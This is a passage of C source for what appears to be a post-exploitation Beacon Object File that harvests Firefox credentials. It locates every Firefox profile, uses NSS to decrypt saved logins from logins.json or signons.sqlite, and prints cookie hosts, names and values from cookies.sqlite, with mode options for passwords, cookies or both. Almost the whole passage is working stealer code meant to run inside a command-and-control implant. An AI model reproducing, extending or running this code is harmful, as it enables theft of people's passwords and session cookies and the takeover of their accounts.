    sqlite3_stmt* stmt = NULL;
    int result = 0;
    int count = 0;

    if (!p_sqlite3_open_v2) {
        return FALSE;
    }

    result = p_sqlite3_open_v2(cookiesDbPath, &db, SQLITE_OPEN_READONLY, NULL);
    if (result != SQLITE_OK) {
        if (db) p_sqlite3_close(db);
        return FALSE;
    }

    result = p_sqlite3_prepare_v2(db,
        "SELECT host, path, name, value FROM moz_cookies LIMIT 50",
        -1, &stmt, NULL);
    if (result != SQLITE_OK) {
        p_sqlite3_close(db);
        return FALSE;
    }

    SafeAppend("\n[+] Cookies:\n");
    SafeAppend("================================\n");

    while ((result = p_sqlite3_step(stmt)) == SQLITE_ROW && count < MAX_ENTRIES_PER_TYPE) {
        const char* host = (const char*)p_sqlite3_column_text(stmt, 0);
        const char* path = (const char*)p_sqlite3_column_text(stmt, 1);
        const char* name = (const char*)p_sqlite3_column_text(stmt, 2);
        const char* value = (const char*)p_sqlite3_column_text(stmt, 3);

        SafeAppend("Host: %s | Path: %s | Name: %s | Value: %s\n",
                  host ? host : "", path ? path : "", name ? name : "", value ? value : "");
        count++;
    }

    SafeAppend("\n[+] Extracted %d cookies\n", count);

    if (stmt) p_sqlite3_finalize(stmt);
    if (db) p_sqlite3_close(db);
    return (result == SQLITE_DONE || result == SQLITE_OK);
}

static BOOL IsEligibleProfile(const char* profilePath, BOOL extractPasswords, BOOL extractCookies) {
    int keyType = DetectKeyDatabase(profilePath);
    BOOL hasPasswords = keyType != PROFILE_KEY_NONE &&
                        (HasLoginsJson(profilePath) || HasSignonsSqlite(profilePath));
    BOOL hasCookies = ProfileHasFile(profilePath, "cookies.sqlite");

    return (extractPasswords && hasPasswords) || (extractCookies && hasCookies);
}

static BOOL ProcessProfile(const char* profilePath, BOOL extractPasswords, BOOL extractCookies) {
    char loginsJsonPath[MAX_PATH] = {0};
    char cookiesDbPath[MAX_PATH] = {0};
    char signonsPath[MAX_PATH] = {0};
    BOOL nssReady = FALSE;
    int keyType = PROFILE_KEY_NONE;

    if (!IsEligibleProfile(profilePath, extractPasswords, extractCookies)) {
        SafeAppend("[!] Profile has none of the requested Firefox data - skipping\n");
        return FALSE;
    }

    keyType = DetectKeyDatabase(profilePath);

    SafeAppend("[*] Processing Profile: %s\n", profilePath);
    if (extractPasswords) {
        SafeAppend("[*] Key database: %s\n",
                  keyType == PROFILE_KEY4_DB ? "key4.db (modern)" :
                  keyType == PROFILE_KEY3_DB ? "key3.db (legacy)" : "not found");
    }

    if (extractPasswords && keyType != PROFILE_KEY_NONE &&
        (HasLoginsJson(profilePath) || HasSignonsSqlite(profilePath))) {
        nssReady = InitializeNSS(profilePath, keyType);
        if (!nssReady) {
            SafeAppend("[!] NSS initialization failed - passwords will be shown encrypted\n");
            SafeAppend("[!] Possible causes: Firefox not installed, master password set, or NSS version mismatch\n");
        }
    }

    if (!BuildPath(loginsJsonPath, sizeof(loginsJsonPath), profilePath, "logins.json") ||
        !BuildPath(cookiesDbPath, sizeof(cookiesDbPath), profilePath, "cookies.sqlite") ||
        !BuildPath(signonsPath, sizeof(signonsPath), profilePath, "signons.sqlite")) {
        SafeAppend("[!] Profile path is too long - skipping\n");
        if (nssReady && !ShutdownNSS()) {
            SafeAppend("[!] NSS shutdown failed; keeping its libraries loaded\n");
        }
        return FALSE;
    }

    if (extractPasswords) {
        if (KERNEL32$GetFileAttributesA(loginsJsonPath) != INVALID_FILE_ATTRIBUTES) {
            ExtractPasswordsFromLoginsJson(loginsJsonPath, nssReady);
        } else if (KERNEL32$GetFileAttributesA(signonsPath) != INVALID_FILE_ATTRIBUTES) {
            ExtractPasswordsFromSignonsSqlite(profilePath, nssReady);
        } else {
            SafeAppend("[!] No password store found (logins.json or signons.sqlite)\n");
        }
    }

    if (extractCookies && KERNEL32$GetFileAttributesA(cookiesDbPath) != INVALID_FILE_ATTRIBUTES) {
        ExtractCookies(cookiesDbPath);
    }

    if (nssReady && !ShutdownNSS()) {
        SafeAppend("[!] NSS shutdown failed; keeping its libraries loaded\n");
    }

    return TRUE;
}

static BOOL ExtractFirefoxData(BOOL extractPasswords, BOOL extractCookies) {
    int i = 0;

    if (extractPasswords && extractCookies) {
        SafeAppend("\n[*] Extraction mode: passwords and cookies\n");
    } else if (extractCookies) {
        SafeAppend("\n[*] Extraction mode: cookies only\n");
    } else {
        SafeAppend("\n[*] Extraction mode: passwords only\n");
    }
    SafeAppend("\n[*] Extracting Firefox Data from All Profiles\n");
    SafeAppend("================================\n");

    if (!FindAllFirefoxProfiles()) {
        SafeAppend("[!] No Firefox profiles found\n");
        return FALSE;
    }

    SafeAppend("[+] Found %d Firefox profile(s)\n\n", profileCount);

    for (i = 0; i < profileCount; i++) {
        ProcessProfile(profilePaths[i], extractPasswords, extractCookies);
    }

    SafeAppend("\n[*] Completed processing %d profile(s)\n", profileCount);

    return TRUE;
}

#ifdef BOF
VOID go(IN PCHAR Buffer, IN ULONG Length) {
    datap parser;
    CHAR* option = NULL;
    CHAR* allocatedOption = NULL;
    CHAR* extractedOption = NULL;
    int extractedLength = 0;
    DWORD payloadLength = 0;
    DWORD fieldLength = 0;
    DWORD i = 0;
    BOOL argumentsValid = TRUE;
    BOOL extractPasswords = TRUE;
    BOOL extractCookies = FALSE;

    bof_output_reset();

    /* Accept only an empty envelope or exactly one canonical typed string. */
    if (Buffer == NULL && Length == 0) {
        /* Some BOF hosts invoke a no-argument entrypoint with no envelope. */
    } else if (Buffer == NULL || Length < sizeof(DWORD)) {
        argumentsValid = FALSE;
    } else {
        MSVCRT$memcpy(&payloadLength, Buffer, sizeof(payloadLength));
        if (payloadLength != Length - sizeof(DWORD)) {
            argumentsValid = FALSE;
        } else if (payloadLength == 0) {
            /* A canonical zero-field envelope contains only its length. */
        } else if (payloadLength < 5) {
            argumentsValid = FALSE;
        } else {
            MSVCRT$memcpy(&fieldLength, Buffer + sizeof(DWORD), sizeof(fieldLength));
            if (fieldLength == 0 || fieldLength >= 256 ||
                fieldLength > payloadLength - sizeof(DWORD) ||
                fieldLength + sizeof(DWORD) != payloadLength ||
                Buffer[2 * sizeof(DWORD) + fieldLength - 1] != '\0') {
                argumentsValid = FALSE;
            }
            for (i = 0; argumentsValid && i + 1 < fieldLength; i++) {
                if (Buffer[2 * sizeof(DWORD) + i] == '\0') {
                    argumentsValid = FALSE;
                }
            }
            if (argumentsValid) {
                BeaconDataParse(&parser, Buffer, Length);
                extractedOption = BeaconDataExtract(&parser, &extractedLength);
                if (extractedOption == NULL || extractedLength != (int)fieldLength) {
                    argumentsValid = FALSE;
                } else {
                    allocatedOption = (CHAR*)intAlloc((SIZE_T)extractedLength + 1);
                    if (allocatedOption == NULL) {
                        argumentsValid = FALSE;
                    } else {
                        MSVCRT$memcpy(allocatedOption, extractedOption, extractedLength);
                        allocatedOption[extractedLength] = '\0';
                        option = allocatedOption;
                    }
                }
            }
        }
    }

    if (!argumentsValid) {
        SafeAppend("[!] Invalid BOF arguments; expected one --mode string.\n");
        if (allocatedOption) intFree(allocatedOption);
        return;
    }

    if (option != NULL) {
        char optionLower[256] = {0};
        int optionIndex = 0;
        for (optionIndex = 0; option[optionIndex] != '\0' && optionIndex < 255; optionIndex++) {
            if (option[optionIndex] >= 'A' && option[optionIndex] <= 'Z') {
                optionLower[optionIndex] = option[optionIndex] + 32;
            } else {
                optionLower[optionIndex] = option[optionIndex];
            }
        }
        optionLower[optionIndex] = '\0';

        if (MSVCRT$_stricmp(optionLower, "/all") == 0 || MSVCRT$_stricmp(optionLower, "all") == 0) {
            extractPasswords = TRUE;
            extractCookies = TRUE;
        }
        else if (MSVCRT$_stricmp(optionLower, "/cookies") == 0 || MSVCRT$_stricmp(optionLower, "cookies") == 0) {
            extractPasswords = FALSE;
            extractCookies = TRUE;
        } else if (optionLower[0] != '\0') {
            SafeAppend("[!] Invalid mode. Use --mode /all or --mode /cookies.\n");
            intFree(allocatedOption);
            return;
        }
    }

    if (!LoadSQLiteFunctions()) {
        SafeAppend("[!] Failed to load SQLite DLL. Make sure winsqlite3.dll is available.\n");
        SafeAppend("[!] Cookie extraction and legacy signons.sqlite will not work.\n");
    }

    ExtractFirefoxData(extractPasswords, extractCookies);

    UnloadSQLiteFunctions();

    if (!ShutdownNSS()) {
        SafeAppend("[!] NSS shutdown failed; keeping its libraries loaded\n");
    }
    UnloadNSSLibraries();

    if (allocatedOption) intFree(allocatedOption);
}
#else
int main(int argc, char* argv[]) {
    BOOL extractPasswords = TRUE;
    BOOL extractCookies = FALSE;

    bof_output_reset();

    if (argc > 1) {
        if (MSVCRT$_stricmp(argv[1], "/all") == 0 || MSVCRT$_stricmp(argv[1], "all") == 0) {
            extractPasswords = TRUE;
            extractCookies = TRUE;
        } else if (MSVCRT$_stricmp(argv[1], "/cookies") == 0 || MSVCRT$_stricmp(argv[1], "cookies") == 0) {
            extractPasswords = FALSE;
            extractCookies = TRUE;
        }
    }

    if (!LoadSQLiteFunctions()) {
        printf("[!] Failed to load SQLite DLL\n");
    }

    ExtractFirefoxData(extractPasswords, extractCookies);
    UnloadSQLiteFunctions();
    if (!ShutdownNSS()) {
        printf("[!] NSS shutdown failed; keeping its libraries loaded\n");
    }
    UnloadNSSLibraries();
    return 0;
}
#endif
